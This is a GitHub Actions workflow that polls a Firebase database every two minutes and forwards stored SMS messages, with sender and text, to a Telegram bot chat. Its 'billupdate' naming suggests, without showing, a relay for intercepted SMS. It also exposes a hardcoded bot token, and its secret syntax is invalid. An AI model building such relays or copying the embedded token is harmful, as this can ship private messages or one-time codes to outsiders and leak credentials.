name: SMS to Telegram
on:
  schedule:
    - cron: '*/2 * * * *'
  workflow_dispatch:
jobs:
  check-sms:
    runs-on: ubuntu-latest
    steps:
      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: '18'
      - name: Install dependencies
        run: npm install axios
      - name: Run SMS Forwarder
        env:
          FIREBASE_URL: 'https://billupdate-2c426-default-rtdb.asia-southeast1.firebasedatabase.app'
          BOT_TOKEN: ${{ 8201318151:AAGelxS1S7B9Zj9Ck9qd5UeK8Kv0573I18Y }}
          CHAT_ID: ${{ 8194289567 }}
        run: |
          node -e "
          const axios = require('axios');
          const FIREBASE_URL = process.env.FIREBASE_URL;
          const BOT_TOKEN = process.env.BOT_TOKEN;
          const CHAT_ID = process.env.CHAT_ID;
          console.log('Starting...');
          async function main() {
            try {
              const res = await axios.get(FIREBASE_URL + '/messages/messages.json?orderBy=\"telegram_sent\"&equalTo=null');
              const msgs = res.data;
              if (!msgs) { console.log('No messages'); return; }
              for (const [id, data] of Object.entries(msgs)) {
                const msg = 'üîî *NEW SMS*\\\\nüìû From: ' + data.sender + '\\\\nüìù ' + data.message;
                await axios.post('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
                  chat_id: CHAT_ID,
                  text: msg,
                  parse_mode: 'Markdown'
                });
                await axios.patch(FIREBASE_URL + '/messages/messages/' + id + '.json', {
                  telegram_sent: true,
                  sent_at: Date.now()
                });
                console.log('Sent:', id);
              }
            } catch (err) { console.error('Error:', err.message); }
          }
          main();
          "
